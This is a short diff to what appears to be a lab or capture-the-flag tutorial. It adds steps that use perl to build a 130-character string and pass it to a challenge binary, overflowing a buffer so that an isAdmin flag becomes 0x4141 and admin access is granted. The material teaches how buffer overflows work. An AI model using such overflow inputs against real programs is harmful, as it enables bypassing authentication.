@@ -66,6 +66,12 @@ What happens when you insert a string which is longer than 128 bytes? Lets try i
 We can use perl to print 130 characters:
 
 ```
+~/challenges/challenge09$ perl -e 'print "A" x 130'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA~/challenges/challenge09$
+```
+
+And use this command as argument by encapsulating it into backticks:
+```
 ~/challenges/challenge09$ ./challenge09 `perl -e 'print "A" x 130'` password
 isAdmin: 0x4141
 You are admin!
